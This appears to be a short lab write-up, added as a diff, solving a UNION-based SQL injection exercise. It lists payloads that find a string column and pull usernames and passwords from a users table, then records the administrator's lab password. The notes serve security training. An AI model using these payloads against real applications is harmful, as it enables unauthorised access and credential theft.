@@ -1,0 +1,20 @@
+==> SQLi lab 10
+==> Goal: get the administrator's username and password and log in into account, union based attack, there is users table which contains username
+and password columns
+
+> see which column has string datatype
+payload: ' UNION SELECT null,'a'--
+200 OK respose means 2nd column has string datatype
+
+> getting the username and passwords from users table
+payload: for getting username: ' UNION SELECT null,username FROM users--
+	 for getting passwords: ' UNION SELECT null,password FROM users--
+
+notice the position of administrator in usernames(in this case its 4th) and when getting password copy the 4th string we get
+
+here..
+username: administrator (on 4th position)
+password: 18gk3pv1m65tnfy2p702
+
+la is solved congrats....
+
